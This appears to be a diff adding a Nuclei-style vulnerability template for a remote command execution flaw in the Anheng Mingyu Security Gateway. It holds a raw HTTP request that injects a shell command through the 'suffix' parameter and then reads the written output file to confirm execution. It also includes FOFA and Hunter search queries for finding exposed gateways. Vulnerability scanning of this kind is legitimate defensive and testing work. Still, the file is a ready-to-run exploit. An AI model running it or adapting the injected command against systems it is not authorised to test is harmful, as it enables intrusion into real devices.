@@ -1,0 +1,37 @@
+id: Anheng-Mingyu-Security-Gateway
+
+info:
+  name: Anheng Mingyu Security Gateway aaa_ Portal_ Auth_ Local_ Submit Remote Command Execution Vulnerability
+  author: Zero Trust Security Attack and Defense Laboratory
+  severity: high
+  description: |
+    Anheng Mingyu Security Gateway aaa_ Portal_ Auth_ Local_ Submit has a remote command execution vulnerability that allows attackers to gain server privileges
+  metadata:
+    fofa-query: body="/webui/images/basic/login/" && title=="明御安全网关"
+    hunter-query: web.title="明御安全网关"&&web.body="/webui/images/basic/login/"
+
+
+http:
+  - raw:
+      - |
+          GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(`id >/usr/local/webui/test.txt`)}} HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
+          Connection: close
+          Accept: */*
+          Content-Type: application/x-www-form-urlencoded
+          Accept-Encoding: gzip
+      - |
+          GET /test.txt  HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+      
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_1, "success")'
+          - 'contains(body_2, "uid")'
+        condition: and
